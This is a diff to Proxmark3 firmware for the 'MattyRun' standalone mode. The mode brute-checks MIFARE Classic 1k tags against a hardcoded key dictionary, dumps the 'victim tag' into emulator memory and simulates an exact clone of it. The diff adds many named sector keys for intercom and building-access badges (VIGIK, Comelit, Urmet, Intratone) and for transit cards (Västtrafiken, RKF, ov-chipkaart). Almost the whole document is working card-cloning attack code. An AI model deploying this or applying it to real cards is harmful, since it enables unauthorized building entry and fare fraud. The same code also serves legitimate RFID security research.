@@ -49,19 +49,16 @@ on a blank card.
 #include "mifaresim.h"  // mifare1ksim
 #include "mifareutil.h"
 
-uint8_t uid[10];
-uint32_t cuid;
-iso14a_card_select_t p_card;
+static uint8_t uid[10];
+static uint32_t cuid;
+static iso14a_card_select_t p_card;
 
-/*
-    Pseudo-configuration block.
-*/
-bool printKeys = false;         // Prints keys
-bool transferToEml = true;      // Transfer keys to emulator memory
-bool ecfill = true;             // Fill emulator memory with cards content.
-bool simulation = true;         // Simulates an exact copy of the target tag
-bool fillFromEmulator = false;  // Dump emulator memory.
-uint8_t stKeyBlock = 20;        // Set the quantity of keys in the block.
+// Pseudo-configuration block.
+static bool printKeys = false;         // Prints keys
+static bool transferToEml = true;      // Transfer keys to emulator memory
+static bool ecfill = true;             // Fill emulator memory with cards content.
+static bool simulation = true;         // Simulates an exact copy of the target tag
+static bool fillFromEmulator = false;  // Dump emulator memory.
 
 //-----------------------------------------------------------------------------
 // Matt's StandAlone mod.
@@ -179,7 +176,8 @@ static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_
 
 /* the chk function is a piwi’ed(tm) check that will try all keys for
 a particular sector. also no tracing no dbg */
-static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace, uint8_t keyCount, uint8_t *datain, uint64_t *key) {
+static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace,
+                           uint8_t keyCount, uint8_t *datain, uint64_t *key) {
     DBGLEVEL = DBG_NONE;
     iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
     set_tracing(false);
@@ -188,13 +186,15 @@ static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace, ui
     struct Crypto1State *pcs;
     pcs = &mpcs;
 
-    for (int i = 0; i < keyCount; ++i) {
+    int retval = -1;
+
+    for (uint8_t i = 0; i < keyCount; i++) {
 
         /* no need for anticollision. just verify tag is still here */
         // if (!iso14443a_fast_select_card(cjuid, 0)) {
         if (!iso14443a_select_card(uid, &p_card, &cuid, true, 0, true)) {
             DbprintfEx(FLAG_NEWLINE, "FATAL : E_MF_LOSTTAG");
-            return -1;
+            break;
         }
 
         uint64_t ui64Key = bytes_to_num(datain + i * 6, 6);
@@ -205,44 +205,110 @@ static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace, ui
             SpinDelayUs(AUTHENTICATION_TIMEOUT);
             continue;
         }
-        crypto1_deinit(pcs);
-        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
         *key = ui64Key;
-        return i;
+        retval = i;
+        break;
     }
     crypto1_deinit(pcs);
     FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
-
-    return -1;
+    return retval;
 }
+
+/* Abusive microgain on original MifareECardLoad :
+ * - *datain used as error return
+ * - tracing is falsed
+ */
+static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
+    DBGLEVEL = DBG_NONE;
+
+    uint8_t numSectors = numofsectors;
+    uint8_t keyType = keytype;
+
+    struct Crypto1State mpcs = {0, 0};
+    struct Crypto1State *pcs;
+    pcs = &mpcs;
+
+    uint8_t dataoutbuf[16];
+    uint8_t dataoutbuf2[16];
+
+    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
+    clear_trace();
+    set_tracing(false);
+
+    int retval = PM3_SUCCESS;
+
+    if (!iso14443a_select_card(uid, &p_card, &cuid, true, 0, true)) {
+        retval = PM3_ESOFT;
+        DbprintfEx(FLAG_RAWPRINT, "Can't select card");
+        goto out;
+    }
+
+    for (uint8_t s = 0; s < numSectors; s++) {
+        uint64_t ui64Key = emlGetKey(s, keyType);
+        if (s == 0) {
+            if (mifare_classic_auth(pcs, cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_FIRST)) {
+                retval = PM3_ESOFT;
+                break;
+            }
+        } else {
+            if (mifare_classic_auth(pcs, cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_NESTED)) {
+                retval = PM3_ESOFT;
+                break;
+            }
+        }
+
+        // failure to read one block,  skips to next sector.
+        for (uint8_t blockNo = 0; blockNo < NumBlocksPerSector(s); blockNo++) {
+            if (mifare_classic_readblock(pcs, cuid, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
+                retval = PM3_ESOFT;
+                break;
+            };
+
+            if (blockNo < NumBlocksPerSector(s) - 1) {
+                emlSetMem(dataoutbuf, FirstBlockOfSector(s) + blockNo, 1);
+            } else {
+                // sector trailer, keep the keys, set only the AC
+                emlGetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
+                memcpy(&dataoutbuf2[6], &dataoutbuf[6], 4);
+                emlSetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
+            }
+        }
+    }
+
+    int res = mifare_classic_halt(pcs, cuid);
+    (void)res;
+
+out:
+    crypto1_deinit(pcs);
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
+    return retval;
+}
+
 
 void ModInfo(void) {
     DbpString("  HF Mifare sniff/clone - aka MattyRun (Matías A. Ré Medina)");
 }
 
+/*
+    It will check if the keys from the attacked tag are a subset from
+    the hardcoded set of keys inside of the ARM. If this is the case
+    then it will load the keys into the emulator memory and also the
+    content of the victim tag, to finally simulate it.
+
+    Alternatively, it can be dumped into a blank card.
+
+    This source code has been tested only in Mifare 1k.
+
+    If you're using the proxmark connected to a device that has an OS, and you're not using the proxmark3 client to see the debug
+    messages, you MUST uncomment usb_disable().
+*/
 void RunMod(void) {
     StandAloneMode();
-    Dbprintf(">>  Matty mifare chk/dump/sim  a.k.a MattyRun Started  <<");
     FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
-
-    /*
-        It will check if the keys from the attacked tag are a subset from
-        the hardcoded set of keys inside of the ARM. If this is the case
-        then it will load the keys into the emulator memory and also the
-        content of the victim tag, to finally simulate it.
-
-        Alternatively, it can be dumped into a blank card.
-
-        This source code has been tested only in Mifare 1k.
-
-        If you're using the proxmark connected to a device that has an OS, and you're not using the proxmark3 client to see the debug
-        messages, you MUST uncomment usb_disable().
-    */
+    Dbprintf(">>  Matty mifare chk/dump/sim  a.k.a MattyRun Started  <<");
 
     // Comment this line below if you want to see debug messages.
     // usb_disable();
-
-
 
     uint16_t mifare_size = 1024;    // Mifare 1k (only 1k supported for now)
     uint8_t sectorSize = 64;        // 1k's sector size is 64 bytes.
@@ -252,9 +318,7 @@ void RunMod(void) {
     uint8_t *keyBlock;              // Where the keys will be held in memory.
     bool keyFound = false;
 
-    /*
-        Set of keys to be used.
-    */
+    // Set of keys to be used.
     uint64_t mfKeys[] = {
         0xffffffffffff, // Default key
         0x000000000000, // Blank key
@@ -269,22 +333,73 @@ void RunMod(void) {
         0xa0478cc39091,
         0x533cb6c723f6,
         0x8fd0a4f256e9,
+        0x484558414354, // INFINEONON A / 0F SEC B / INTRATONE / HEXACT...
+        0x414c41524f4e, // ALARON NORALSY
+        0x424c41524f4e, // BLARON NORALSY
+        0x4a6352684677, // COMELIT A General Key  / 08 [2] 004
+        0x536653644c65, // COMELIT B General Key  / 08 [2] 004
+        0x8829da9daf76, // URMET CAPTIV IF A => ALL A/B / BTICINO
+        0x314B49474956, // "1KIGIV" VIGIK'S SERVICE BADGE A KEY
+        0x021209197591, // BTCINO UNDETERMINED SPREAKD 0x01->0x13 key
+        0x010203040506, // VIGIK's B Derivative
+        0xa22ae129c013, // INFINEON B 00
+        0x49fae4e3849f, // INFINEON B 01
+        0x38fcf33072e0, // INFINEON B 02
+        0x8ad5517b4b18, // INFINEON B 03
+        0x509359f131b1, // INFINEON B 04
+        0x6c78928e1317, // INFINEON B 05
+        0xaa0720018738, // INFINEON B 06
+        0xa6cac2886412, // INFINEON B 07
+        0x62d0c424ed8e, // INFINEON B 08
+        0xe64a986a5d94, // INFINEON B 09
+        0x8fa1d601d0a2, // INFINEON B 0A
+        0x89347350bd36, // INFINEON B 0B
+        0x66d2b7dc39ef, // INFINEON B 0C
+        0x6bc1e1ae547d, // INFINEON B 0D
+        0x22729a9bd40f,  // INFINEON B 0E
+        0xd2ece8b9395e, // lib / Nat Bieb
+        0x1494E81663D7, // # NSCP default key
+        0x569369c5a0e5, // # kiev
+        0x632193be1c3c, // # kiev
+        0x644672bd4afe, // # kiev
+        0x8fe644038790, // # kiev
+        0x9de89e070277, // # kiev
+        0xb5ff67cba951, // # kiev / ov-chipkaart
+        0xeff603e1efe9, // # kiev
+        0xf14ee7cae863, // # kiev
+        0xfc00018778f7, // # Västtrafiken KeyA, RKF ÖstgötaTrafiken KeyA
+        0x0297927c0f77, // # Västtrafiken KeyA
+        0x54726176656c, // # Västtrafiken KeyA
+        0x00000ffe2488, // # Västtrafiken KeyB
+        0x776974687573, // # Västtrafiken KeyB
+        0xee0042f88840, // # Västtrafiken KeyB
+        0x26940b21ff5d, // # RKF SLKeyA
+        0xa64598a77478, // # RKF SLKeyA
+        0x5c598c9c58b5, // # RKF SLKeyB
+        0xe4d2770a89be, // # RKF SLKeyB
+        0x722bfcc5375f, // # RKF RejskortDanmark KeyA
+        0xf1d83f964314, // # RKF RejskortDanmark KeyB
+        0x505249564141, // # RKF JOJOPRIVAKeyA
+        0x505249564142, // # RKF JOJOPRIVAKeyB
+        0x47524f555041, // # RKF JOJOGROUPKeyA
+        0x47524f555042, // # RKF JOJOGROUPKeyB
+        0x434f4d4d4f41, // # RKF JOJOGROUPKeyA
+        0x434f4d4d4f42, // # RKF JOJOGROUPKeyB
+        0x4b0b20107ccb, // # TNP3xxx
     };
 
     /*
         This part allocates the byte representation of the
         keys in keyBlock's memory space .
     */
-    keyBlock = BigBuf_malloc(stKeyBlock * 6);
+    keyBlock = BigBuf_malloc(ARRAYLEN(mfKeys) * 6);
     int mfKeysCnt = ARRAYLEN(mfKeys);
 
     for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++) {
         num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t *)(keyBlock + mfKeyCounter * 6));
     }
 
-    /*
-        Pretty print of the keys to be checked.
-    */
+    // Pretty print of the keys to be checked.
     if (printKeys) {
         Dbprintf("[+] Printing mf keys");
         for (uint8_t keycnt = 0; keycnt < mfKeysCnt; keycnt++)
@@ -301,18 +416,19 @@ void RunMod(void) {
     */
     bool validKey[2][40];
     uint8_t foundKey[2][40][6];
-    for (uint16_t t = 0; t < 2; t++) {
+    for (uint8_t i = 0; i < 2; i++) {
         for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
-            validKey[t][sectorNo] = false;
-            for (uint16_t i = 0; i < 6; i++) {
-                foundKey[t][sectorNo][i] = 0xff;
-            }
+            validKey[i][sectorNo] = false;
+            foundKey[i][sectorNo][0] = 0xFF;
+            foundKey[i][sectorNo][1] = 0xFF;
+            foundKey[i][sectorNo][2] = 0xFF;
+            foundKey[i][sectorNo][3] = 0xFF;
+            foundKey[i][sectorNo][4] = 0xFF;
+            foundKey[i][sectorNo][5] = 0xFF;
         }
     }
 
-    /*
-        Iterates through each sector checking if there is a correct key.
-    */
+    // Iterates through each sector checking if there is a correct key.
     bool err = 0;
     bool allKeysFound = true;
     uint32_t size = mfKeysCnt;
@@ -324,7 +440,7 @@ void RunMod(void) {
             int key = saMifareChkKeys(block, type, true, size, &keyBlock[0], &key64);
             if (key == -1) {
                 LED(LED_RED, 50);
-                Dbprintf("\t✕ Key not found for this sector!");
+                Dbprintf("\t [✕] Key not found for this sector!");
                 allKeysFound = false;
                 // break;
             } else if (key == -2) {
@@ -334,7 +450,7 @@ void RunMod(void) {
                 num_to_bytes(key64, 6, foundKey[type][sec]);
                 validKey[type][sec] = true;
                 keyFound = true;
-                Dbprintf("\t✓ Found valid key: [%02x%02x%02x%02x%02x%02x]\n",
+                Dbprintf("\t [✓] Found valid key: [%02x%02x%02x%02x%02x%02x]\n",
                          (keyBlock + 6 * key)[0], (keyBlock + 6 * key)[1], (keyBlock + 6 * key)[2],
                          (keyBlock + 6 * key)[3], (keyBlock + 6 * key)[4], (keyBlock + 6 * key)[5]
                         );
@@ -371,8 +487,9 @@ void RunMod(void) {
         emlClearMem();
 
         uint8_t mblock[16];
-        for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
+        for (uint8_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
             if (validKey[0][sectorNo] || validKey[1][sectorNo]) {
+
                 emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1); // data, block num, blocks count (max 4)
                 for (uint16_t t = 0; t < 2; t++) {
                     if (validKey[t][sectorNo]) {
@@ -382,47 +499,40 @@ void RunMod(void) {
                 emlSetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1);
             }
         }
-        Dbprintf("\t✓ Found keys have been transferred to the emulator memory.");
+
+        Dbprintf("\t [✓] Found keys have been transferred to the emulator memory.");
+
         if (ecfill) {
             int filled;
             Dbprintf("\tFilling in with key A.");
-            filled = MifareECardLoad(sectorsCnt, 0);
-            if (filled != PM3_SUCCESS) {
-                Dbprintf("\t✕ Failed filling with A.");
-            }
 
-            Dbprintf("\tFilling in with key B.");
-            filled = MifareECardLoad(sectorsCnt, 1);
+            filled = saMifareECardLoad(sectorsCnt, 0);
             if (filled != PM3_SUCCESS) {
-                Dbprintf("\t✕ Failed filling with B.");
+
+                Dbprintf("\t [✕] Failed filling with A.");
+                Dbprintf("\tFilling in with key B.");
+                filled = saMifareECardLoad(sectorsCnt, 1);
+                if (filled != PM3_SUCCESS) {
+                    Dbprintf("\t [✕] Failed filling with B.");
+                }
             }
 
             if ((filled == PM3_SUCCESS) && simulation) {
-                Dbprintf("\t✓ Emulator memory filled, simulation started.");
+                Dbprintf("\t [✓] Emulator memory filled, simulation started.");
 
                 // This will tell the fpga to emulate using previous keys and current target tag content.
                 Dbprintf("\t Press button to abort simulation at anytime.");
 
                 LED_B_ON(); // green
-                // assuming arg0==0,  use hardcoded uid 0xdeadbeaf
-                uint16_t simflags;
-                switch (p_card.uidlen) {
-                    case 10:
-                        simflags = FLAG_10B_UID_IN_DATA;
-                        break;
-                    case 7:
-                        simflags = FLAG_7B_UID_IN_DATA;
-                        break;
-                    default:
-                        simflags = FLAG_4B_UID_IN_DATA;
-                        break;
-                }
-                Mifare1ksim(simflags | FLAG_MF_1K, 0, uid, 0, 0);
-                LED_B_OFF();
 
-                /*
-                    Needs further testing.
-                */
+                uint16_t simflags = FLAG_UID_IN_EMUL | FLAG_MF_1K;
+
+                SpinOff(1000);
+                Mifare1ksim(simflags, 0, uid, 0, 0);
+                LED_B_OFF();
+                Dbprintf("\t [✓] Simulation ended");
+
+                // Needs further testing.
                 if (fillFromEmulator) {
                     uint8_t retry = 5;
                     Dbprintf("\t Trying to dump into blank card.");
@@ -457,8 +567,10 @@ void RunMod(void) {
                     }
 
                 }
-            } else if (filled != PM3_SUCCESS) {
-                Dbprintf("\t✕ Emulator memory could not be filled due to errors.");
+            }
+
+            if (filled != PM3_SUCCESS) {
+                Dbprintf("\t [✕] Emulator memory could not be filled due to errors.");
                 LED_C_ON();
             }
         }
